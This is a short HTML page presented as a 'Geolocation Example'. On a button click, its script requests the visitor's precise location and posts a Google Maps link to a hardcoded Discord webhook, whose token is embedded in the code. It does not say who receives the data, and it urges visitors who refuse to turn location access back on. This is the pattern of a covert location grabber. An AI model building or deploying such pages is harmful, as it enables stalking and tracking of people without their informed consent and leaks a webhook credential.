<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation Example</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #status {
            margin-top: 20px;
            font-size: 18px;
            color: #333;
        }
        #instructions {
            display: none;
            margin-top: 20px;
            font-size: 16px;
            color: #555;
        }
        #testLocation {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #testLocation:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <h1>Geolocation Example</h1>
    <p id="status">Click the button below to attempt to access your location.</p>
    <button id="testLocation">Get Location</button>
    <p id="instructions">
        If you denied the request for location access, please enable it in your browser settings to send your location.
        <br><br>
        For iOS Safari: Go to <a href="https://support.apple.com/en-us/HT207056" target="_blank">Settings > Safari > Location</a> and select "Allow".
    </p>

    <script>
        document.getElementById('testLocation').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true
                });
            } else {
                document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
            }
        });

        function sendPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const webhookUrl = "https://discord.com/api/webhooks/1272943176063123621/6MwZvPOZPoKX_iupyJJ-E19Kb9gZVeYfUH0IeLL-PrYUNOeXlq4j1aJSLyKcce4kdT1C";

            const data = {
                content: `Current location: https://www.google.com/maps?q=${latitude},${longitude}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    document.getElementById('status').textContent = "Location sent successfully!";
                } else {
                    document.getElementById('status').textContent = "Failed to send location.";
                }
            }).catch(error => {
                document.getElementById('status').textContent = "Error: " + error;
            });
        }

        function showError(error) {
            let errorMessage = "An unknown error occurred.";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "User denied the request for Geolocation. Please enable location access in your browser settings.";
                    document.getElementById('instructions').style.display = 'block';
                    document.getElementById('testLocation').disabled = true;
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    errorMessage = "The request to get user location timed out.";
                    break;
            }
            document.getElementById('status').textContent = errorMessage;
        }
    </script>
</body>
</html>
